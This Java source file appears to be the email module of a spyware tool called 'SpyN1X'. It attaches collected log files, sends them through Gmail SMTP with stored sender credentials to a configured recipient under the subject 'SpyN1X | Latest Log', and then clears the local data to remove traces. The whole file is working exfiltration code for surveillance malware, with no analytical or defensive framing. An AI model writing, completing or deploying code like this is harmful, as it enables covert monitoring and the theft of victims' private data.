package ml.inix.service;

import ml.inix.Config;
import ml.inix.util.Color;
import ml.inix.util.FileManager;
import ml.inix.util.Log;
import org.apache.commons.mail.EmailAttachment;
import org.apache.commons.mail.EmailException;
import org.apache.commons.mail.MultiPartEmail;

import java.io.File;

public class Email {
    private MultiPartEmail email;

    public Email() {
        try {
            this.email = new MultiPartEmail();
            email.setDebug(false);
            email.setHostName("smtp.google.com");
            email.setSSL(true);
            email.addTo(Config.REC_MAIL);
            email.setFrom(Config.SENDER_EMAIL);
            email.setAuthentication(Config.SENDER_EMAIL, Config.SENDER_PASS);
            email.setSubject("SpyN1X | Latest Log");
            email.setMsg("This is system generated message. Please find the attachments below:");
        }
        catch (EmailException e) {
            Log.out(Color.RED + e.getMessage());
        }
    }

    public void addAttachment(String file, String des) {
        File file1 = new File(file);
        EmailAttachment attachment = new EmailAttachment();
        attachment.setPath(file1.getPath());
        attachment.setDisposition(EmailAttachment.ATTACHMENT);
        attachment.setDescription(des);
        attachment.setName(file1.getName());
        try {
            this.email.attach(attachment);
        } catch (EmailException e) {
            Log.out(Color.RED + e.getMessage());
        }
    }

    public void send() {
        Log.out(Color.YELLOW + "[*] Sending email...");
        try {
            email.send();
            Log.out(Color.GREEN + "[*] Email send successfully");
            FileManager.clearAllData();
        } catch (EmailException e) {
            Log.out(Color.RED + e.getMessage());
        }
    }
}
